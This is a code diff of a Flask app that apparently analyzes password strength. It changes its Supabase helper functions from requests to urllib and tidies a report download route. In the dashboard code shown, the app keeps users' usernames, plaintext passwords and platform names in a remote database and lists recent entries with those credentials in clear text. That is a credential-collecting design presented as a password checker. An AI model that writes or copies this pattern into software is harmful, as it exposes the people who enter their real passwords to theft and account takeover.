@@ -3,8 +3,10 @@ from flask_limiter import Limiter
 from flask_limiter.util import get_remote_address
 from flask_wtf.csrf import CSRFProtect
 import os
+import json
 import datetime
-import requests
+import urllib.request
+import urllib.error
 from utils.analyzer import analyze_password
 from utils.generator import generate_password as gen_pass
 from utils.report_builder import generate_txt_report, generate_csv_report, generate_json_report
@@ -43,40 +45,33 @@ def supabase_insert(table, data):
             "Content-Type": "application/json",
             "Prefer": "return=minimal"
         }
-        response = requests.post(url, headers=headers, json=data, timeout=5)
-        if response.status_code in (200, 201):
-            return True
-        else:
-            print(f"Supabase insert failed: {response.status_code} {response.text}")
-            return False
+        body = json.dumps(data).encode('utf-8')
+        req = urllib.request.Request(url, data=body, headers=headers, method='POST')
+        with urllib.request.urlopen(req, timeout=5) as resp:
+            return resp.status in (200, 201)
     except Exception as e:
-        print(f"Supabase error: {e}")
+        print(f"Supabase insert error: {e}")
         return False
 
 
-def supabase_select(table, order=None, limit=None):
+def supabase_select(table, order=None):
     if not SUPABASE_URL or not SUPABASE_KEY:
         return []
     try:
-        url = f"{SUPABASE_URL}/rest/v1/{table}"
+        params = "select=*"
+        if order:
+            params += f"&order={order}"
+        url = f"{SUPABASE_URL}/rest/v1/{table}?{params}"
         headers = {
             "apikey": SUPABASE_KEY,
             "Authorization": f"Bearer {SUPABASE_KEY}",
             "Content-Type": "application/json"
         }
-        params = {"select": "*"}
-        if order:
-            params["order"] = order
-        if limit:
-            params["limit"] = limit
-        response = requests.get(url, headers=headers, params=params, timeout=5)
-        if response.status_code == 200:
-            return response.json()
-        else:
-            print(f"Supabase select failed: {response.status_code} {response.text}")
-            return []
+        req = urllib.request.Request(url, headers=headers, method='GET')
+        with urllib.request.urlopen(req, timeout=5) as resp:
+            return json.loads(resp.read().decode('utf-8'))
     except Exception as e:
-        print(f"Supabase error: {e}")
+        print(f"Supabase select error: {e}")
         return []
 
 
@@ -150,7 +145,6 @@ def report(format):
 
     log_data = session['last_log_data']
     analysis = session['last_analysis']
-
     full_data = {**log_data, "crack_times": analysis['crack_times']}
 
     if format == 'txt':
@@ -172,12 +166,7 @@ def report(format):
     buffer.write(content.encode('utf-8'))
     buffer.seek(0)
 
-    return send_file(
-        buffer,
-        as_attachment=True,
-        download_name=filename,
-        mimetype=mimetype
-    )
+    return send_file(buffer, as_attachment=True, download_name=filename, mimetype=mimetype)
 
 
 @app.route('/api/dashboard', methods=['GET'])
@@ -186,22 +175,19 @@ def dashboard():
     if not DASHBOARD_KEY or provided_key != DASHBOARD_KEY:
         return jsonify({"error": "Unauthorized"}), 403
 
-    total = 0
+    rows = supabase_select("logs", order="id.desc")
+    total = len(rows)
     total_score = 0
     weak_count = 0
     strong_count = 0
     platforms = {}
     recent = []
 
-    rows = supabase_select("logs", order="id.desc")
-    total = len(rows)
-
     for row in rows[:5]:
         recent.append(
             f"Date: {row.get('timestamp')} | Platform: {row.get('platform')} | "
             f"Username: {row.get('username')} | Password: {row.get('password')} | "
-            f"Length: {row.get('length')} | Score: {row.get('score')} | "
-            f"Entropy: {row.get('entropy')} | Crack Time: {row.get('crack_time')}"
+            f"Score: {row.get('score')} | Crack Time: {row.get('crack_time')}"
         )
 
     for row in rows:
